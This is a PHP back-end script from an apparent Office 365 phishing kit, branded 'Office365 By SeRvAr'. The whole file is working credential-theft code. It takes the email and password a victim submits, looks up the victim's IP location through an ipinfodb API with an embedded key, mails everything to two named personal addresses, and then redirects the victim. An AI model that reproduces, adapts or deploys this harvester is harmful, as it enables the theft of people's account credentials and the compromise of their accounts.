<?php
$email=$_GET['email'];
$ip = getenv("REMOTE_ADDR");

//Get IP Country City
$url = "http://api.ipinfodb.com/v3/ip-country/?key=bdf624a70b290f75ecdf08f61ba30bb97b946fcd08a5dd35eeaabbc7b6b3f354&ip=$ip";
$url = "http://api.ipinfodb.com/v3/ip-city/?key=bdf624a70b290f75ecdf08f61ba30bb97b946fcd08a5dd35eeaabbc7b6b3f354&ip=$ip";
$ipCountryCityInfo = file_get_contents($url);
//

$message .= "--------[Office365 By SeRvAr]------\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Country: ".$ipCountryCityInfo."\n";
$message .= "--------[Hacked By SeRvAr iNC]------\n";

$recipient = "cageluisa@gmail.com, a.dimick@yandex.com";
$subject = "1- Office 365 - $ip";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."n";
$headers .= "MIME-Version:1.0";
     mail("$cc", "rcn Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: on.php?resolver=true");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>